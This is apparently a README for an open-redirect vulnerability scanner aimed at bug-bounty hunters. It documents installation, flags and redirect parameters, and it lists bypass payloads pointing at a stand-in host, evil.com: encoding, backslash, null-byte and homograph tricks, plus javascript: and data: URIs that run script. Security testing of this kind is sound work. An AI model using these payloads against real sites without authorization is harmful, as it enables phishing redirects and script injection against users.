# 🚀 Advanced Open Redirect Scanner v4.0

A powerful, feature-rich Python tool designed to detect Open Redirect vulnerabilities using advanced bypass techniques and multiple detection methods.

![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Status](https://img.shields.io/badge/status-active-success.svg)

---

## 📋 Table of Contents

- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [Parameters](#-parameters)
- [Payload Techniques](#-payload-techniques)
- [Detection Methods](#-detection-methods)
- [Examples](#-examples)
- [Output Format](#-output-format)
- [Best Practices](#-best-practices)
- [Legal Disclaimer](#-legal-disclaimer)

---

## ✨ Features

### 🎯 Core Capabilities
- **70+ Redirect Parameters** - Comprehensive parameter list covering common and uncommon redirect parameters
- **50+ Advanced Payloads** - Multiple bypass techniques and encoding variations
- **Multi-Method Detection** - HTTP headers, JavaScript redirects, Meta refresh tags, and browser-based execution
- **cURL Verification** - Confirms actual redirects to eliminate false positives
- **Severity Classification** - Automatically categorizes vulnerabilities (Critical/High/Medium)
- **Async Scanning** - High-speed concurrent scanning with configurable threads
- **Multiple Export Formats** - JSON and CSV export options
- **Detailed Logging** - Comprehensive logs for debugging and audit trails

### 🔍 Detection Techniques
- HTTP Location & Refresh headers
- JavaScript window.location variations
- Meta refresh tags
- Headless browser execution (Playwright)
- Protocol-relative URL redirects
- Encoded payload detection
- DOM-based redirects

---

## 📦 Installation

### Prerequisites
```bash
# Python 3.8 or higher
python3 --version

# pip package manager
pip3 --version

# curl (for verification)
curl --version
```

### Step 1: Clone or Download
```bash
# Option 1: Download the script directly
wget https://raw.githubusercontent.com/yourusername/redirect-scanner/main/scanner.py

# Option 2: Clone repository
git clone https://github.com/yourusername/redirect-scanner.git
cd redirect-scanner
```

### Step 2: Install Dependencies
```bash
pip3 install -r requirements.txt
```

**requirements.txt:**
```
requests>=2.28.0
aiohttp>=3.8.0
beautifulsoup4>=4.11.0
termcolor>=2.0.0
playwright>=1.30.0
urllib3>=1.26.0
```

### Step 3: Install Playwright Browsers
```bash
playwright install chromium
```

### Step 4: Make Executable (Optional)
```bash
chmod +x scanner.py
```

---

## 🎮 Usage

### Basic Syntax
```bash
python3 scanner.py [OPTIONS]
```

### Required Arguments (One of):
- `-u, --url <URL>` - Single URL to scan
- `-f, --file <FILE>` - File containing list of URLs (one per line)

### Optional Arguments:
| Flag | Description | Default |
|------|-------------|---------|
| `-p, --params <PARAMS>` | Custom parameters (comma-separated) | Built-in 70+ params |
| `-pl, --payloads <FILE>` | Custom payloads file | Built-in 50+ payloads |
| `-t, --threads <N>` | Number of concurrent threads | 10 |
| `--timeout <N>` | Request timeout in seconds | 15 |
| `-o, --export <FORMAT>` | Export format (json/csv) | None |
| `-d, --debug` | Enable debug mode | False |
| `-s, --silent` | Silent mode (minimal output) | False |
| `--no-browser` | Skip browser-based checks | False |
| `-h, --help` | Show help message | - |

---

## 🔧 Parameters

The scanner includes **70+ redirect parameters** commonly used in web applications:

### Standard Parameters
```
next, url, redirect, return, to, continue, dest, destination, path, 
redirect_uri, return_url, window, link, view, go, goto, target, rurl
```

### Advanced Parameters
```
callback, checkout_url, return_to, forward_url, success_url, load_url,
navigate, navigation, redirect_url, returnTo, callback_url, location
```

### Custom Parameters
You can add custom parameters:
```bash
python3 scanner.py -u https://example.com -p "custom_param,my_redirect,goto_url"
```

---

## 💉 Payload Techniques

### 1. Protocol-Relative URLs
```
//evil.com
//evil.com/
//evil.com//
//evil.com/%2F..
```

### 2. URL Encoding
```
https%3A%2F%2Fevil.com
%2F%2Fevil.com
%252F%252Fevil.com (double encoding)
```

### 3. Backslash Bypasses
```
\evil.com
\\evil.com
/\evil.com
\/evil.com
```

### 4. Whitespace & Special Chars
```
/%09/evil.com (tab)
/%0a/evil.com (newline)
/%0d/evil.com (carriage return)
/%20/evil.com (space)
```

### 5. Multiple Slashes
```
///evil.com
////evil.com
```

### 6. @ Symbol Tricks
```
https://legitimate.com@evil.com
https://evil.com@legitimate.com
```

### 7. JavaScript Protocols
```
javascript:alert(document.domain)
javascript://%0aalert(document.domain)
jAvAsCrIpT:alert(1) (case variation)
```

### 8. Data URIs
```
data:text/html,<script>alert(document.domain)</script>
data://text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 9. Null Byte Injection
```
//evil.com%00.legitimate.com
//evil.com%2500.legitimate.com
```

### 10. Unicode & Homograph
```
//evil。com (Unicode dot)
//еvil.com (Cyrillic 'e')
```

---

## 🔍 Detection Methods

### 1. HTTP Header Analysis
- **Location Header**: Checks standard redirect header
- **Refresh Header**: Detects meta-refresh style redirects

### 2. JavaScript Detection
Scans for 8+ JavaScript redirect patterns:
```javascript
window.location.href = "url"
window.location = "url"
location.href = "url"
window.location.assign("url")
window.location.replace("url")
document.location = "url"
window.open("url")
```

### 3. Meta Tag Analysis
```html
<meta http-equiv="refresh" content="0;url=evil.com">
```

### 4. Browser-Based Execution
- Uses Playwright for headless Chrome
- Detects JavaScript alert/confirm dialogs
- Tracks actual navigation
- Handles dynamic redirects

### 5. cURL Verification
- Follows redirect chain
- Confirms final destination
- Reduces false positives

---

## 📚 Examples

### Example 1: Single URL Scan
```bash
python3 scanner.py -u https://example.com/redirect?next=
```

### Example 2: Multiple URLs from File
```bash
# Create urls.txt
echo "https://example.com/login?next=" > urls.txt
echo "https://test.com/redirect?url=" >> urls.txt

# Scan
python3 scanner.py -f urls.txt
```

### Example 3: High-Speed Scan with 20 Threads
```bash
python3 scanner.py -f urls.txt -t 20
```

### Example 4: Export Results to JSON
```bash
python3 scanner.py -f urls.txt -o json
```

### Example 5: Export Results to CSV
```bash
python3 scanner.py -f urls.txt -o csv
```

### Example 6: Custom Parameters
```bash
python3 scanner.py -u https://example.com -p "goto,forward,jump"
```

### Example 7: Custom Payloads
```bash
# Create payloads.txt
echo "//mycanary.com" > payloads.txt
echo "https://attacker.com" >> payloads.txt

# Scan with custom payloads
python3 scanner.py -u https://example.com -pl payloads.txt
```

### Example 8: Debug Mode
```bash
python3 scanner.py -u https://example.com -d
```

### Example 9: Silent Mode (No Output Until Complete)
```bash
python3 scanner.py -f urls.txt -s
```

### Example 10: Skip Browser Checks (Faster)
```bash
python3 scanner.py -f urls.txt --no-browser
```

---

## 📊 Output Format

### Console Output
```
================================================================================
📊 SCAN RESULTS SUMMARY
================================================================================

🔴 Critical: 3
🟠 High: 5
🟡 Medium: 2

📈 Total Vulnerabilities: 10

================================================================================
🔍 DETAILED FINDINGS
================================================================================

[Critical] Open Redirect Detected
  • Target URL: https://example.com/redirect
  • Parameter: next
  • Payload: javascript:alert(document.domain)
  • Detection Method: js_execution
  • Redirects To: JavaScript Executed
  • cURL Verified: ✅ Yes
  • Test URL: https://example.com/redirect?next=javascript:alert(document.domain)
  • Timestamp: 2025-11-29 15:30:45
  ----------------------------------------------------------------------------
```

### JSON Export Format
```json
[
  {
    "original_url": "https://example.com/redirect",
    "parameter": "next",
    "payload": "//evil.com",
    "test_url": "https://example.com/redirect?next=//evil.com",
    "vulnerable": true,
    "method": "header_location",
    "redirect_to": "https://evil.com",
    "severity": "High",
    "curl_verified": true,
    "timestamp": "2025-11-29 15:30:45"
  }
]
```

### CSV Export Format
```csv
original_url,parameter,payload,test_url,method,redirect_to,severity,curl_verified,timestamp
https://example.com,next,//evil.com,https://example.com?next=//evil.com,header_location,https://evil.com,High,true,2025-11-29 15:30:45
```

---

## 🎯 Best Practices

### For Bug Bounty Hunters
1. **Always get permission** before scanning targets
2. **Start with single URL** to test before bulk scanning
3. **Use custom canary domains** you control for verification
4. **Export results** for detailed reporting
5. **Verify manually** before submitting reports

### For Security Teams
1. **Scan in staging environment** first
2. **Schedule scans** during low-traffic periods
3. **Adjust thread count** based on server capacity
4. **Review logs** for false positives
5. **Integrate with CI/CD** for continuous testing

### Performance Tips
```bash
# Fast scan (skip browser checks)
python3 scanner.py -f urls.txt --no-browser -t 20

# Thorough scan (all detection methods)
python3 scanner.py -f urls.txt -t 10

# Large target list (controlled rate)
python3 scanner.py -f large_urls.txt -t 5 --timeout 30
```

---

## 🔒 Security Considerations

### Configure Canary Domains
Edit the `CANARY_DOMAINS` list in the script:
```python
CANARY_DOMAINS = ["your-domain.com", "attacker.burpcollaborator.net"]
```

### Rate Limiting
Adjust threads to avoid overloading targets:
```bash
# Conservative (slow but safe)
python3 scanner.py -f urls.txt -t 3

# Moderate (balanced)
python3 scanner.py -f urls.txt -t 10

# Aggressive (fast but may trigger WAF)
python3 scanner.py -f urls.txt -t 50
```

---

## 📝 Logging

All scans create detailed log files:
```
redirect_scan_20251129_153045.log
```

Log format:
```
2025-11-29 15:30:45 | INFO | Starting scan for 10 targets
2025-11-29 15:30:46 | DEBUG | Testing: https://example.com?next=//evil.com
2025-11-29 15:30:47 | INFO | Vulnerability found: Open Redirect
```

---

## 🐛 Troubleshooting

### Issue: "curl command not found"
```bash
# Install curl
sudo apt-get install curl  # Debian/Ubuntu
sudo yum install curl      # CentOS/RHEL
brew install curl          # macOS
```

### Issue: "Playwright browser not installed"
```bash
playwright install chromium
```

### Issue: "Too many open files"
```bash
# Increase system limits (Linux)
ulimit -n 4096

# Or reduce threads
python3 scanner.py -f urls.txt -t 5
```

### Issue: "Connection timeout"
```bash
# Increase timeout
python3 scanner.py -f urls.txt --timeout 30
```

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add your improvements
4. Test thoroughly
5. Submit a pull request

---

## 📄 Legal Disclaimer

**IMPORTANT**: This tool is for educational and authorized security testing only.

### You MUST:
✅ Obtain written permission before testing any systems
✅ Only test systems you own or have explicit authorization to test
✅ Comply with all applicable laws and regulations
✅ Use responsibly and ethically

### You MUST NOT:
❌ Use this tool for unauthorized access
❌ Test systems without permission
❌ Use for malicious purposes
❌ Violate any laws or terms of service

**The author is not responsible for misuse of this tool. By using this software, you agree to use it responsibly and legally.**

---

## 📜 License

MIT License - See LICENSE file for details

---

## 👨‍💻 Author

**Jass**
- Security Researcher
- Bug Bounty Hunter

---

## 🙏 Acknowledgments

- OWASP for security research guidelines
- Bug bounty platforms for responsible disclosure
- Open source security community

---

## 📞 Support

For issues, questions, or suggestions:
- Open an issue on GitHub
- Contact: security@example.com

---

**Happy Hunting! 🎯**

*Remember: Always hack ethically and responsibly.*
